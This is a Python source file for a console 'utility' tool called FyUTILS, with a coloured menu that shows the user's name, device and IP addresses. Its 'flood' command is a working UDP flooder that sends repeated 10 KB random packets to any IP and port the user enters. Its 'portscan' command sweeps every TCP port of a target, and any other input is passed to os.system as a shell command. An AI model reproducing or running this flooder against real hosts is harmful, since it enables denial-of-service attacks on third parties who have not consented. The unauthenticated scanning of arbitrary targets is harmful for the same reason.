try:
    import os
    import platform
    import sys
    import time
    import random
    import socket
    import requests

    from datetime import datetime
    from colorama import Fore, init

except:
    os.system("pip install colorama")
    os.system("pip install datetime")
    os.system("pip install requests")

init(convert=True)


def menu():
    os.system("cls")
    print(color() + "  __________               _____  __   ________   ________   ______       ________")
    time.sleep(0.03)
    print(color() + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    time.sleep(0.03)
    print(color() + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \ ")
    time.sleep(0.03)
    print(color() + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    time.sleep(0.03)
    print(color() + "  /_/         _\__, /      \____/      /_/        /___/      /_____/      /____/  ")
    time.sleep(0.03)
    print(color() + "              /____/                                                              ")
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Username:  " + username)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Device:    " + device)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Filepath:  " + dir)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Threads:   " + str(threads))
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Version:   " + version + "-" + versiontype)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Private:   " + privateip)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "║ " + color() + "[VAR] " + Fore.WHITE + "Public:    " + publicip)
    time.sleep(0.03)
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")


def color():
    config = open(dir + "\\config.txt").readlines()[0]
    if config.rstrip() == "GREEN":
        rc = Fore.GREEN
    elif config.rstrip() == "LIME":
        rc = Fore.LIGHTGREEN_EX
    elif config.rstrip() == "AQUA" or config == "CYAN":
        rc = Fore.CYAN
    elif config.rstrip() == "YELLOW":
        rc = Fore.YELLOW
    elif config.rstrip() == "PINK" or config == "MAGENTA":
        rc = Fore.MAGENTA
    elif config.rstrip() == "WHITE":
        rc = Fore.WHITE
    elif config.rstrip() == "RED":
        rc = Fore.RED
    elif config.rstrip() == "BLUE":
        rc = Fore.BLUE
    elif config.rstrip() == "LAVA":
        rc = Fore.LIGHTRED_EX
    else:
        return Fore.WHITE
    return rc


def now():
    now = datetime.now().strftime("%H:%M:%S")
    return now


def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((floodtarget, floodport))
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        for i in range(floodattacks):
            sock.send(random.randbytes(1024 * 10))
            print(
                Fore.LIGHTBLACK_EX + "[" + color() + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Bytes have been sent to " + color() + floodtarget + Fore.LIGHTBLACK_EX + ":" + color() + str(
                    floodport) + Fore.WHITE + "!" + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Thread: " + color() + "Multi-thread working currently not available!" + Fore.LIGHTBLACK_EX + " - " + Fore.WHITE + "Attack: " + color() + str(
                    i + 1), end='\r')
        print("\n")
    except KeyboardInterrupt:
        print(Fore.WHITE + "\nCanceling Action...\n")
    except:
        print(Fore.WHITE + "\nTarget doesn't respond!\n")
        time.sleep(3)


def portscan():
    print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
    print("")
    try:
        print(Fore.WHITE + "Prepairing scan.", end='\r')
        time.sleep(0.1)
        print(Fore.WHITE + "Prepairing scan..", end='\r')
        time.sleep(0.1)
        print(Fore.WHITE + "Prepairing scan...", end='\r')
        for scanport in range(1, 65535):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.001)
            result = sock.connect_ex((scantarget, scanport))
            print(
                Fore.LIGHTBLACK_EX + "[" + Fore.RED + "-" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Scanning Port... " + color() + str(
                    scanport), end='\r')
            if result == 0:
                print(
                    Fore.LIGHTBLACK_EX + "[" + color() + "+" + Fore.LIGHTBLACK_EX + "]" + Fore.WHITE + " Port " + color() + str(
                        scanport) + Fore.WHITE + " is open!                  ")
            sock.close()
        print("\n")
    except KeyboardInterrupt:
        print(Fore.WHITE + "\nCanceling Action...\n")
    except:
        print(Fore.WHITE + "\nTarget doesn't respond!\n")
        time.sleep(3)


def ipchange():
    print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
    print("")
    os.system("")
    print("")


os.system("title FyUTILS Stable v1.0 - " + os.getlogin() + " - " + platform.node() + " - " + "Starting up...")
username = os.getlogin()
device = platform.node()
dir = sys.path.__getitem__(0)
threads = os.cpu_count()
version = "1.0"
versiontype = "STABLE"
privateip = socket.gethostbyname(socket.gethostname())
try:
    publicip = requests.get("https://api.ipify.org").content.decode()
except:
    publicip = "Not online!"

try:
    config = open(dir + "\\config.txt").readlines()[0]
except:
    print("Config not found! Creating config...")
    time.sleep(0.03)
    open(dir + "\\config.txt", "x").writelines("AQUA")
    time.sleep(0.03)
    print(Fore.WHITE + "Please restart FyUTILS!")
    time.sleep(0.03)
    os.system("pause")
    time.sleep(0.03)
    sys.exit()

menu()

while True:
    try:
        os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Idle")

        try:
            cmd = input(Fore.LIGHTBLACK_EX + "╔═══[" + Fore.WHITE + username + Fore.LIGHTBLACK_EX + "@" + color() + device + Fore.LIGHTBLACK_EX + "]═══(" + color() + "FyUTILS " + Fore.WHITE + version + Fore.LIGHTBLACK_EX + "-" + Fore.WHITE + versiontype + Fore.LIGHTBLACK_EX + ")" + "\n" + "╚═══" + Fore.LIGHTBLACK_EX + "> " + Fore.WHITE).lower()
        except KeyboardInterrupt:
            os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Shutting down...")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1.5)
            sys.exit()

        os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Executing '" + str(cmd) + "'")

        if cmd == "exit":
            os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Shutting down...")
            print("")
            print(Fore.WHITE + "Shutting down FyUTILS...")
            time.sleep(1.5)
            sys.exit()

        elif cmd == "rl":
            print("")
            os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Reloading...")
            print("")
            menu()

        elif cmd == "clear":
            print("")
            os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Reloading...")
            print("")
            menu()

        elif cmd == "flood":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                floodtarget = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                floodport = int(input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target port" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                floodattacks = int(input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Attacks" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE))
                flood()
            except:
                None

        elif cmd == "color":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                colorvalue = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Value" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE).upper()
                open(dir + "\\config.txt", "w").writelines(colorvalue)
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Changes saved to file!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                print("")
            except:
                print("")

        elif cmd == "resetconfig":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                print(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "The config has been reset!")
                print(Fore.LIGHTBLACK_EX + "╚" + "═" * 119)
                open(dir + "\\config.txt", "w").writelines("AQUA")
                print("")
            except:
                print("")

        elif cmd == "portscan":
            print("")
            print(Fore.LIGHTBLACK_EX + "╔" + "═" * 119)
            try:
                scantarget = input(Fore.LIGHTBLACK_EX + "║ " + Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " > " + Fore.WHITE)
                portscan()
            except:
                None

        else:
            os.system(cmd)
            print(Fore.WHITE)

        os.system("title FyUTILS Stable v1.0 - " + username + " - " + device + " - " + "Idle")
    except KeyboardInterrupt:
        print("")
